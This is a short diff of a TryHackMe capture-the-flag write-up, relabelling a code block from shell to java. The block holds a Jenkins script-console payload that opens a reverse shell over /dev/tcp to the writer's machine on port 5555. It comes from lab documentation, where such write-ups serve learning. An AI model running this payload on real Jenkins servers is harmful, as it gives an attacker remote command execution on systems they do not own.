@@ -505,7 +505,7 @@ We're in the server. So with jenkins have a script console for any code executio
 ![20 script consol](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/43d03f9a-fe69-4ae8-bdc4-ae2abda25f19)
 
 
-```shell
+```java
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<My IP>/5555;cat<&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
